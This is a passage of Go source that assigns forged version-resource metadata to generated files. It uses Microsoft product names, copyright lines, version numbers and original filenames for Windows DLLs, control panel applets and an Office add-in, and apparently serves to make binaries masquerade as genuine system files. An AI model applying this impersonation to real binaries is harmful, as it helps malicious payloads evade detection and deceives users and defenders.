			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "21.170.0822.0002"
			vi.FixedFileInfo.FileVersion.Major = 21
			vi.FixedFileInfo.FileVersion.Minor = 170
			vi.FixedFileInfo.FileVersion.Patch = 2
			vi.FixedFileInfo.FileVersion.Build = 822
			vi.StringFileInfo.InternalName = "OneDrive.exe"
		}
		if name == "apphelp" {
			vi.StringFileInfo.InternalName = "Apphelp"
			vi.StringFileInfo.FileDescription = "Application Compatibility Client Library"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "Apphelp.dll"
		}
		if name == "bcryptprimitives" {
			vi.StringFileInfo.InternalName = "bcryptprimitives.dll"
			vi.StringFileInfo.FileDescription = "Windows Cryptographic Primitives Library"
			vi.StringFileInfo.FileVersion = "10.0.18362.836 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.836"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 836
			vi.StringFileInfo.OriginalFilename = "bcryptprimitives.dll"
		}
		if name == "cfgmgr32" {
			vi.StringFileInfo.InternalName = "cfgmgr32.dll"
			vi.StringFileInfo.FileDescription = "Configuration Manager DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.387 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.387"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 387
			vi.StringFileInfo.OriginalFilename = "cfgmgr32.dll"
		}
		if name == "combase" {
			vi.StringFileInfo.InternalName = "COMBASE.DLL"
			vi.StringFileInfo.FileDescription = "Microsoft COM for Windows"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "COMBASE.DLL"
		}
		if name == "cryptsp" {
			vi.StringFileInfo.InternalName = "cryptsp.dll"
			vi.StringFileInfo.FileDescription = "Cryptographic Service Provider API"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "cryptsp.dll"
		}
		if name == "dnsapi" {
			vi.StringFileInfo.InternalName = "dnsapi"
			vi.StringFileInfo.FileDescription = "DNS Client API DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "dnsapi"
		}
		if name == "dpapi" {
			vi.StringFileInfo.InternalName = "dpapi.dll"
			vi.StringFileInfo.FileDescription = "Data Protection API"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "dpapi.dll"
		}
		if name == "sechost" {
			vi.StringFileInfo.InternalName = "sechost.dll"
			vi.StringFileInfo.FileDescription = "Host for SCM/SDDL/LSA Lookup APIs"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "sechost.dll"
		}
		if name == "schannel" {
			vi.StringFileInfo.InternalName = "schannel.dll"
			vi.StringFileInfo.FileDescription = "TLS / SSL Security Provider"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "schannel.dll"
		}
		if name == "urlmon" {
			vi.StringFileInfo.InternalName = "UrlMon.dll"
			vi.StringFileInfo.FileDescription = "OLE32 Extensions for Win32"
			vi.StringFileInfo.FileVersion = "11.00.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 11
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Internet Explorer"
			vi.StringFileInfo.ProductVersion = "11.00.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "UrlMon.dll"
		}
		if name == "win32u" {
			vi.StringFileInfo.InternalName = "Win32u"
			vi.StringFileInfo.FileDescription = "Win32u"
			vi.StringFileInfo.FileVersion = "10.0.18362.900 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.LegalTrademarks = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.900"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.OriginalFilename = "Win32u"
		}
		if name == "appwizard" {
			vi.StringFileInfo.InternalName = "appwiz.cpl"
			vi.StringFileInfo.FileDescription = "Shell Application Manager"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "APPWIZ.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "appwiz.cpl"
		}
		if name == "bthprop" {
			vi.StringFileInfo.InternalName = "bthprops.cpl"
			vi.StringFileInfo.FileDescription = "Bluetooth Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "bluetooth.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "bthprops.cpl"
		}
		if name == "desktop" {
			vi.StringFileInfo.InternalName = "desk.cpl"
			vi.StringFileInfo.FileDescription = "Desktop Settings Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "DESK.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "DESK"

		}
		if name == "netfirewall" {
			vi.StringFileInfo.InternalName = "Firewall.cpl"
			vi.StringFileInfo.FileDescription = "Windows Defender Firewall Control Panel DLL Launching Stub"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Firewall.cpl"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "Firewall.cpl"
		}
		if name == "FlashPlayer" {
			vi.StringFileInfo.InternalName = " Adobe Flash Player Control Panel Applet 32.0"
			vi.StringFileInfo.FileDescription = " Adobe Flash Player Control Panel Applet"
			vi.StringFileInfo.FileVersion = "32.0.0.255"
			vi.StringFileInfo.LegalCopyright = " Copyright © 1996-2019 Adobe. All Rights Reserved. Adobe and Flash are either trademarks or registered trademarks in the United States and/or other countries."
			vi.StringFileInfo.OriginalFilename = "FlashPlayerCPLApp.cpl"
			vi.FixedFileInfo.ProductVersion.Patch = 0
			vi.FixedFileInfo.ProductVersion.Major = 32
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "32.0.0.255"
			vi.FixedFileInfo.FileVersion.Major = 32
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 0
			vi.FixedFileInfo.FileVersion.Build = 255
			vi.StringFileInfo.InternalName = "FlashPlayerCPLApp.cpl"
		}
		if name == "hardwarewiz" {
			vi.StringFileInfo.InternalName = "hdwwiz.cpl"
			vi.StringFileInfo.FileDescription = "Add Hardware Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "hdwwiz.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "hdwwiz"
		}
		if name == "inet" {
			vi.StringFileInfo.InternalName = "inetcpl.cpl"
			vi.StringFileInfo.FileDescription = "Internet Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "inetcpl.cpl"
		}
		if name == "control" {
			vi.StringFileInfo.InternalName = "intl.cpl"
			vi.StringFileInfo.FileDescription = "Control Panel DLL"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = ""
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "CONTROL"
		}
		if name == "irprop" {
			vi.StringFileInfo.InternalName = "irprops.cpl"
			vi.StringFileInfo.FileDescription = "Infrared Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "irprops.cpl"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "Infrared Properties"
		}
		if name == "Game" {
			vi.StringFileInfo.InternalName = "joy.cpl"
			vi.StringFileInfo.FileDescription = "Game Controllers Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "JOY.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "JOY.CPL"
		}
		if name == "inputs" {
			vi.StringFileInfo.InternalName = "main.cpl"
			vi.StringFileInfo.FileDescription = "Mouse and Keyboard Control Panel Applets"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "main.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "main.cpl"

		}
		if name == "mimosys" {
			vi.StringFileInfo.InternalName = "mmsys.dll"
			vi.StringFileInfo.FileDescription = "Audio Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "MMSys.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "mmsys.cpl"
		}
		if name == "ncp" {
			vi.StringFileInfo.InternalName = "ncpa.cpl"
			vi.StringFileInfo.FileDescription = "Network Connections Control-Panel Stub"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "ncpa.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "ncpa.cpl"
		}
		if name == "power" {
			vi.StringFileInfo.InternalName = "powercfg.cpl"
			vi.StringFileInfo.FileDescription = "Power Management Configuration Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "POWERCFG.CPL.MUI"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "powercfg.cpl"
		}
		if name == "speech" {
			vi.StringFileInfo.InternalName = "sapi.cpl"
			vi.StringFileInfo.FileDescription = "Speech UX Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "sapi.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "sapi.cpl"
		}

		if name == "system" {
			vi.StringFileInfo.InternalName = "sysdm.cpl"
			vi.StringFileInfo.FileDescription = "System Applet for the Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "sysdm.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "sysdm.cpl"
		}
		if name == "Tablet" {
			vi.StringFileInfo.InternalName = "TabletPC.cpl"
			vi.StringFileInfo.FileDescription = "Tablet PC Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "tabletpc.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "TabletPC.cpl"
		}
		if name == "telephone" {
			vi.StringFileInfo.InternalName = "telephon.cpl"
			vi.StringFileInfo.FileDescription = "Telephony Control Panel"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "telephon.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "telephon.cpl"
		}
		if name == "datetime" {
			vi.StringFileInfo.InternalName = "timedate.cpl"
			vi.StringFileInfo.FileDescription = "Time Date Control Panel Applet"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "timedate.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "timedate.cpl"
		}
		if name == "winsec" {
			vi.StringFileInfo.InternalName = "wscui.cpl"
			vi.StringFileInfo.FileDescription = "Security and Maintenance"
			vi.StringFileInfo.FileVersion = "10.0.18362.1 (WinBuild.160101.0800)"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "wscui.cpl.mui"
			vi.FixedFileInfo.ProductVersion.Patch = 18362
			vi.FixedFileInfo.ProductVersion.Major = 10
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft® Windows® Operating System"
			vi.StringFileInfo.ProductVersion = "10.0.18362.1"
			vi.FixedFileInfo.FileVersion.Major = 10
			vi.FixedFileInfo.FileVersion.Minor = 0
			vi.FixedFileInfo.FileVersion.Patch = 18362
			vi.FixedFileInfo.FileVersion.Build = 1
			vi.StringFileInfo.InternalName = "wscui.cpl"
		}
		if name == "Timesheet" {
			vi.StringFileInfo.InternalName = "Timesheet.xll "
			vi.StringFileInfo.FileDescription = "Timesheet ToolPak"
			vi.StringFileInfo.FileVersion = "16.0.10001.10000"
			vi.StringFileInfo.LegalCopyright = "© Microsoft Corporation. All rights reserved."
			vi.StringFileInfo.OriginalFilename = "Timesheet.xll"
			vi.FixedFileInfo.ProductVersion.Patch = 10001
			vi.FixedFileInfo.ProductVersion.Major = 16
			vi.FixedFileInfo.ProductVersion.Minor = 0
			vi.StringFileInfo.ProductName = "Microsoft Office"
			vi.StringFileInfo.ProductVersion = "16.0.10001.10000"
			vi.FixedFileInfo.FileVersion.Major = 16
			vi.FixedFileInfo.FileVersion.Minor = 0
